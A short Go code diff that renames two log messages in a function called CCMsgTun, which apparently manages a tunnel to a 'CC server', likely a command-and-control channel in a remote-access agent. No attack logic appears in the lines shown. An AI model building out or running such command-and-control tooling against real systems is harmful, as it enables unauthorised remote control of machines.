@@ -108,11 +108,11 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	defer func() {
 		err = H2Json.Close()
 		if err != nil {
-			log.Print("CCTun closing: ", err)
+			log.Print("CCMsgTun closing: ", err)
 		}
 
 		cancel()
-		log.Print("CCTun closed")
+		log.Print("CCMsgTun closed")
 	}()
 
 	// check for CC server's response
